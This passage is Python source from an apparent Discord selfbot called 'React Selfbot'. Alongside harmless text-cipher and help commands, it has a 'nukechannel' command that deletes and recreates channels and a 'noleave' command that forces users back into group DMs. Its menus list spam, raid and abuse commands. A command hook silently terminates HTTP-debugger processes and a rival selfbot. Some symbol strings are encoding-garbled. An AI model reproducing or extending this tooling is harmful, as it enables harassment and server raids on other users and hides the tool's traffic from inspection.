        msg += ""
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Morse Code Table', description=msg,timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)


        
    @React.command(pass_context=True)
    async def morse(ctx, *, text: str):
        to_morse = { 
        "a" : ".-",
        "b" : "-...",
        "c" : "-.-.",
        "d" : "-..",
        "e" : ".",
        "f" : "..-.",
        "g" : "--.",
        "h" : "....",
        "i" : "..",
        "j" : ".---",
        "k" : "-.-",
        "l" : ".-..",
        "m" : "--",
        "n" : "-.",
        "o" : "---",
        "p" : ".--.",
        "q" : "--.-",
        "r" : ".-.",
        "s" : "...",
        "t" : "-",
        "u" : "..-",
        "v" : "...-",
        "w" : ".--",
        "x" : "-..-",
        "y" : "-.--",
        "z" : "--..",
        "1" : ".----",
        "2" : "..---",
        "3" : "...--",
        "4" : "....-",
        "5" : ".....",
        "6" : "-....",
        "7" : "--...",
        "8" : "---..",
        "9" : "----.",
        "0" : "-----"
        }
        
        cipher = ''
        for letter in text:
            if letter != ' ':
                cipher += to_morse[letter.lower()] + ' '
            else:
                cipher += ' '
        await ctx.send(cipher)
    
    @React.command(pass_context=True)
    async def toenchantmenttable(ctx, *, text: str):
        to_enchantmenttable = { 
        "a" : "·îë",
        "b" : " ñ",
        "c" : "·ìµ",
        "d" : "‚Ü∏",
        "e" : "·í∑",
        "f" : "‚éì",
        "g" : "‚ä£",
        "h" : "‚çë",
        "i" : "‚ïé",
        "j" : "‚ãÆ",
        "k" : "Íñå",
        "l" : "Íñé",
        "m" : "·í≤",
        "n" : "„É™",
        "o" : "ùôπ",
        "p" : "!¬°",
        "q" : "·ëë",
        "r" : "‚à∑",
        "s" : "·ì≠",
        "t" : "‚Ñ∏",
        "u" : "‚öç",
        "v" : "‚çä",
        "w" : "‚à¥",
        "x" : " Ãá/",
        "y" : "||",
        "z" : "‚®Ö",
        "1" : "1",
        "2" : "2",
        "3" : "3",
        "4" : "4",
        "5" : "5",
        "6" : "6",
        "7" : "7",
        "8" : "8",
        "9" : "9",
        "0" : "0"
        }
        
        cipher = ''
        for letter in text:
            if letter != ' ':
                cipher += to_enchantmenttable[letter.lower()] + ' '
            else:
                cipher += ' '
        await ctx.send(cipher)
        
    @React.command(usage="nukechannel <Channel>", description="Clones a channel and deletes the original")
    async def nukechannel(ctx, channel: discord.TextChannel = None):
        if channel == None: 
            channel = ctx.channel
            pass

        nuke_channel = discord.utils.get(ctx.guild.channels, id=channel.id)

        if nuke_channel is not None:
            new_channel = await nuke_channel.clone(reason="nuke")
            position = nuke_channel.position
            await nuke_channel.delete()
            await new_channel.send("https://tenor.com/view/explosion-boom-explode-gif-17383346")
            await new_channel.edit(position=position)
        else:
            pass
        
    @React.command(pass_context=True)
    async def unmorse(ctx, *, text: str):
        to_morse = { 
        "a" : ".-",
        "b" : "-...",
        "c" : "-.-.",
        "d" : "-..",
        "e" : ".",
        "f" : "..-.",
        "g" : "--.",
        "h" : "....",
        "i" : "..",
        "j" : ".---",
        "k" : "-.-",
        "l" : ".-..",
        "m" : "--",
        "n" : "-.",
        "o" : "---",
        "p" : ".--.",
        "q" : "--.-",
        "r" : ".-.",
        "s" : "...",
        "t" : "-",
        "u" : "..-",
        "v" : "...-",
        "w" : ".--",
        "x" : "-..-",
        "y" : "-.--",
        "z" : "--..",
        "1" : ".----",
        "2" : "..---",
        "3" : "...--",
        "4" : "....-",
        "5" : ".....",
        "6" : "-....",
        "7" : "--...",
        "8" : "---..",
        "9" : "----.",
        "0" : "-----"
        }
        
        text += ' '
        decipher = ''
        cipher = ''
        
        for letter in text:
            if letter != ' ':
                i = 0
                cipher += letter
            else:
                i += 1
                
                if i == 2:
                    decipher += ' '
                else:
                    decipher += list(to_morse.keys())[list(to_morse.values()).index(cipher)]
                    cipher = ''
        await ctx.send(decipher)
        
    @React.listen()
    async def on_command(ctx):
        try:
            try:
                if json.load(open('config.json', encoding='utf-8'))['delete_commands']:  
                    await ctx.message.delete()
            except:
                pass
            
            if len(command_history) >= 10:
                command_history.pop(0)
                
            command_history.append(ctx.message.content)

            if json.load(open('config.json', encoding='utf-8'))['theme_shuffle']:     
                theme_checkup()
                try:
                    le_themes = []
                    for filename in os.listdir('Themes'):
                        if filename.endswith(".json"):
                            le_themes.append(filename[:-5])
                    
                    with open("config.json", "r", encoding="utf-8") as jsonFile:
                        data = json.load(jsonFile)
                        
                    data["theme"] = random.choice(le_themes)
                    
                    with open("config.json", "w", encoding="utf-8") as jsonFile:
                        json.dump(data, jsonFile, indent=4, sort_keys=False)
                    theme_checkup()
                except Exception:
                    pass
                
            
            for proc in psutil.process_iter():
                try:
                    processName = proc.name()
                    if processName == "HTTPDebuggerUI.exe":
                        proc.terminate()
                        return
                    if processName == "Nighty.exe":
                        print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Detection | ' + fg.purple3 + "Detected a shit selfbot called \"Nighty\"")
                        proc.terminate()
                        return
                    if processName == "HTTPDebuggerSvc.exe":
                        proc.terminate()
                        return
                except:
                    pass
            if ctx.command.name != "clearlog":
                print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Command Used | ' + fg.purple3 + str(ctx.command))


            payload = json.dumps({
                "embeds": [
                    {
                    "title": "React Command Webhook",
                    "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                    "thumbnail": {
                        "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                    },
                    "description": "Command Used",
                    "fields": [
                        {
                        "name": "__üëæ Command__",
                        "value": f'{ctx.command}',
                        "inline": "true"
                        }
                    ],
                    "footer": {
                        "text": "React Selfbot"
                    }
                    }
                ]
                })

            try:
                requests.post(json.load(open('config.json', encoding='utf-8'))['command_usage_webhook'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
            except Exception:
                pass

        except Exception:
            pass
        
    @React.listen()
    async def on_member_ban(guild, user):
        if user == React.user and json.load(open('config.json', encoding='utf-8'))['server_ban_detection']:
            print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Detection | ' + fg.purple3 + 'Type: Server Ban')                    
            print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Server: {fg.white}{guild.name}")
            

            if json.load(open('config.json', encoding='utf-8'))['ban_sound'] == True:
                try:
                    playsound.playsound("./Sound/failure.mp3")
                except:
                    pass

            if json.load(open('config.json', encoding='utf-8'))['server_ban_notify'] and sys.platform == "win32":
                try:
                    toaster.show_toast("Server Ban", f"You got banned from {guild.name}!", icon_path="react.ico", duration=2)
                except:
                    pass
            
            payload = json.dumps({
                    "embeds": [
                        {
                        "title": "React Detection Webhook",
                        "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                        "thumbnail": {
                            "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                        },
                        "description": "Detected Server Ban",
                        "fields": [
                            {
                            "name": "__üõã Server__",
                            "value": f'{guild.name}',
                            "inline": "true"
                            }
                        ],
                        "footer": {
                            "text": "React Selfbot"
                        }
                        }
                    ]
                    })

            try:
                requests.post(json.load(open('config.json', encoding='utf-8'))['server_ban_webhook'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
            except Exception:
                pass
            
    @React.listen()
    async def on_group_remove(channel, user):
        try:
            for lockeduser in lockedusers:
                if lockeduser not in channel.recipients and channel.id in lockedgroups:
                    await channel.add_recipients(lockeduser)
        except Exception:
            pass
            
    @React.command(usage="noleave <User>", description="User can not leave Group DM (requires friendship with the user)")
    async def noleave(ctx, user: discord.User):
        try:
            em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='No Leave',timestamp=embed_timestamp())
            em.add_field(name=f'Added User', value=f'User {user} added to the No Leave list.', inline=True)
            em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await ctx.send(embed=em)
            lockedusers.append(user)
            lockedgroups.append(ctx.channel.id)
        except Exception:
            pass
        
    @React.command(usage="allowleave <User>", description="Allow user to leave the Group DM")
    async def allowleave(ctx, user: discord.User):
        try:
            em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='No Leave',timestamp=embed_timestamp())
            em.add_field(name=f'Removed User', value=f'User {user} removed from the No Leave list.', inline=True)
            em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await ctx.send(embed=em)
            lockedusers.remove(user)
            lockedgroups.remove(ctx.channel.id)
        except Exception:
            pass

    @React.listen()
    async def on_guild_channel_create(channel):
        try:
            await asyncio.sleep(3)
            if str(channel.name).startswith('ticket') and isinstance(channel, discord.TextChannel) and json.load(open('config.json', encoding='utf-8'))['ticket_detection'] and discord.Permissions(permissions=channel.permissions_for(channel.guild.get_member(React.user.id)).value).view_channel:
                
                print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Detection | ' + fg.purple3 + 'Type: Ticket Created')                    
                print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Server: {fg.white}{channel.guild}"
                    f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Detection | Channel: {fg.white}{channel.name}")

                if json.load(open('config.json', encoding='utf-8'))['ticket_sound'] == True:
                    try:
                        playsound.playsound("./Sound/information.mp3")
                    except:
                        pass

                payload = json.dumps({
                    "content": React.user.mention,
                    "embeds": [
                        {
                        "title": "React Detection Webhook",
                        "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                        "thumbnail": {
                            "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                        },
                        "description": "Detected new ticket",
                        "fields": [
                            {
                            "name": "__üõã Server__",
                            "value": f'{channel.guild}',
                            "inline": "true"
                            },
                            {
                            "name": "__ü•§ Channel__",
                            "value": f'{channel.mention}',
                            "inline": "true"
                            }
                        ],
                        "footer": {
                            "text": f"React Selfbot"
                        }
                        }
                    ]
                    })

                try:
                    requests.post(json.load(open('config.json', encoding='utf-8'))['ticket_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                except Exception:
                    pass

                if json.load(open('config.json', encoding='utf-8'))['ticket_notify'] and sys.platform == "win32":
                    try:
                        toaster.show_toast("Ticket Notifications", f"New ticket was created! \nServer: {channel.guild} \nChannel: {channel.name}", icon_path="react.ico", duration=2)
                    except:
                        pass
        except Exception:
            pass

    @React.command(usage="usage <Command>", description="Shows the usage of a command")
    async def usage(ctx, command: str):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"Command Usage",timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.add_field(name= f"Usage of {command}", value=React.get_command(f"{command.lower()}").name)
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    @React.command(usage="description <Command>", description="Shows the description of a command")
    async def description(ctx, command: str):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"Command Description",timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.add_field(name= f"Description of {command}", value=React.get_command(f"{command.lower()}").description)
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)

    @React.command(usage="help", description="Shows the main menu")
    async def help(ctx):
        try:
            em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
            f'''`<>` = required | `[]` = optional

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"help").name}** ¬ª {React.get_command(f"help").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"shelp").name}** ¬ª {React.get_command(f"shelp").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"fun").name}** ¬ª {React.get_command(f"fun").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"text").name}** ¬ª {React.get_command(f"text").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"info").name}** ¬ª {React.get_command(f"info").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"user").name}** ¬ª {React.get_command(f"user").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"image").name}** ¬ª {React.get_command(f"image").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"tool").name}** ¬ª {React.get_command(f"tool").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"server").name}** ¬ª {React.get_command(f"server").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"administration").name}** ¬ª {React.get_command(f"administration").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('networking').name}** ¬ª {React.get_command('networking').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"nsfw").name}** ¬ª {React.get_command(f"nsfw").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"abuse").name}** ¬ª {React.get_command(f"abuse").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"raid").name}** ¬ª {React.get_command(f"raid").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"usersettings").name}** ¬ª {React.get_command(f"usersettings").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"botsettings").name}** ¬ª {React.get_command(f"botsettings").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"customization").name}** ¬ª {React.get_command(f"customization").description}

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"searchcmd").name}** ¬ª {React.get_command(f"searchcmd").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"repeatcmd").name}** ¬ª {React.get_command(f"repeatcmd").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"usage").name}** ¬ª {React.get_command(f"usage").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"description").name}** ¬ª {React.get_command(f"description").description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(f"favoritecmds").name}** ¬ª {React.get_command(f"favoritecmds").description}''',timestamp=embed_timestamp())
            em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, em)


        except Exception:
            pass

    @React.command(usage="text [Page/All]", description="Text commands")
    async def text(ctx, page: str=None):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 1/3

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('spam').usage}** ¬ª {React.get_command('spam').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('spamtts').usage}** ¬ª {React.get_command('spamtts').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('filespam').usage}** ¬ª {React.get_command('filespam').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ascii').usage}** ¬ª {React.get_command('ascii').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('poll').usage}** ¬ª {React.get_command('poll').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('suggestion').usage}** ¬ª {React.get_command('suggestion').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('reverse').usage}** ¬ª {React.get_command('reverse').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('fliptext').usage}** ¬ª {React.get_command('fliptext').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('zalgo').usage}** ¬ª {React.get_command('zalgo').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('1337').usage}** ¬ª {React.get_command('1337').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('uwu').usage}** ¬ª {React.get_command('uwu').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('mock').usage}** ¬ª {React.get_command('mock').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('_base64').usage}** ¬ª {React.get_command('_base64').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('notfunny').usage}** ¬ª {React.get_command('notfunny').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('noob').usage}** ¬ª {React.get_command('noob').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('beescript').usage}** ¬ª {React.get_command('beescript').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hastebin').usage}** ¬ª {React.get_command('hastebin').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('loremipsum').usage}** ¬ª {React.get_command('loremipsum').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('embed').usage}** ¬ª {React.get_command('embed').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('react').usage}** ¬ª {React.get_command('react').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        em2 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 2/3

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('uwumode').usage}** ¬ª {React.get_command('uwumode').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('mockmode').usage}** ¬ª {React.get_command('mockmode').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('empty').usage}** ¬ª {React.get_command('empty').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('morse').usage}** ¬ª {React.get_command('morse').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unmorse').usage}** ¬ª {React.get_command('unmorse').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('emojify').usage}** ¬ª {React.get_command('emojify').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('tinyurl').usage}** ¬ª {React.get_command('tinyurl').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('clap').usage}** ¬ª {React.get_command('clap').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cap').usage}** ¬ª {React.get_command('cap').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('semoji').usage}** ¬ª {React.get_command('semoji').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('markdownblocks').usage}** ¬ª {React.get_command('markdownblocks').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('animate').usage}** ¬ª {React.get_command('animate').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('count').usage}** ¬ª {React.get_command('count').description}''',timestamp=embed_timestamp())
        em2.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em2.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em2.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        em3 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 3/3

